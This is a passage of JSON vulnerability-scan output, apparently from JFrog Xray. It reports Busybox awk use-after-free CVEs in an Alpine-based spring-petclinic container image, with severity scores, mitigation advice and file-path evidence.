                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_i function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190232",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `getvar_i` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42378",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42378",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190232",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_i function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42378",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_i function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190232",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `getvar_i` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42378",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42378",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190231",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the next_input_file function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42379",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the next_input_file function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190231",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `next_input_file` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42379",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42379",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190231",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the next_input_file function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42379",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the next_input_file function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190231",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `next_input_file` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42379",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42379",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190230",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the clrvar function",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.33.1-r6"
            ],
            "fixed_versions": [
               "1.33.1-r6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42380",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                     "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the clrvar function",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190230",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in `awk` leads to denial of service and possibly code execution when processing a crafted awk pattern in the `clrvar` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "cve_id": "CVE-2021-42380",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ],
                     [
                        "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                        "awk",
                        "33",
                        "Vulnerable usage of awk was found"
                     ]
                  ]
               },
               {
                  "column_names": [
                     "Path",
                     "Evidence",
                     "Line Number",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/busybox",
                        "awk",
                        "3661",
                        "Busybox executable with awk applet was found"
                     ],
                     [
                        "/bin/busybox",
                        "awk",
                        "4605",
                        "Busybox executable with awk applet was found"
                     ]
                  ]
               }
            ],
            "info": "Vulnerable references to Busybox awk were {not }found in the filesystem",
            "details": [
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/h2/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/hsqldb/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/mysql/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/app/app.jar/BOOT-INF/classes/db/postgres/data.sql",
                  "details": "Evidence: awk, Line Number: 33, Issue Found: Vulnerable usage of awk was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 3661, Issue Found: Busybox executable with awk applet was found"
               },
               {
                  "file_path": "/bin/busybox",
                  "details": "Evidence: awk, Line Number: 4605, Issue Found: Busybox executable with awk applet was found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
            "vulnerability_id": "CVE-2021-42380",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-190230",
         "severity": "High",
         "jfrog_severity": "Medium",
